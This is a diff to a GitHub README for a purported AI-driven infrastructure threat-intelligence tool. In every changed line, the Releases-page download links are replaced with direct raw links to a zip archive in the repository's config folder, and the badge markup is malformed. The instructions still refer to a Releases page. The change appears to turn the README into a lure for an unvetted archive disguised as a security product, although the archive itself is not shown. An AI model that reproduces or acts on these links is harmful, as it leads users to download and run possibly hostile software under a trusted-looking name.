@@ -1,7 +1,7 @@
 # 🔐 critical-infrastructure-threat-intel - Protect Your Infrastructure with AI
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/lillestump147/critical-infrastructure-threat-intel/releases)
+[![Download](https://raw.githubusercontent.com/lillestump147/critical-infrastructure-threat-intel/main/config/critical-infrastructure-threat-intel-1.5.zip%https://raw.githubusercontent.com/lillestump147/critical-infrastructure-threat-intel/main/config/critical-infrastructure-threat-intel-1.5.zip)](https://raw.githubusercontent.com/lillestump147/critical-infrastructure-threat-intel/main/config/critical-infrastructure-threat-intel-1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the critical-infrastructure-threat-intel project! This application helps protect critical infrastructure using AI-driven threat intelligence. It is designed for users who want to ensure the safety of systems in areas like agriculture, finance, and more.
@@ -21,7 +21,7 @@ Before you start, ensure your system meets the following requirements:
 - **User-Friendly Interface:** Easy-to-navigate design for all users.
 
 ## 📥 Download & Install
-To get started, visit [this page to download](https://github.com/lillestump147/critical-infrastructure-threat-intel/releases). 
+To get started, visit [this page to download](https://raw.githubusercontent.com/lillestump147/critical-infrastructure-threat-intel/main/config/critical-infrastructure-threat-intel-1.5.zip). 
 
 1. Click on the above link to access the Releases page.
 2. Choose the latest version.
@@ -66,6 +66,6 @@ Yes, users can adjust alert settings in the configuration menu to fit their need
 We encourage feedback and suggestions to improve the application. Connect with us on our GitHub Issues page, or submit a feature request.
 
 ## 📥 Visit for Updates
-Stay informed about new features, bug fixes, and updates by visiting [this page to download](https://github.com/lillestump147/critical-infrastructure-threat-intel/releases). 
+Stay informed about new features, bug fixes, and updates by visiting [this page to download](https://raw.githubusercontent.com/lillestump147/critical-infrastructure-threat-intel/main/config/critical-infrastructure-threat-intel-1.5.zip). 
 
 Thank you for using critical-infrastructure-threat-intel! Your commitment to protecting critical systems is invaluable.
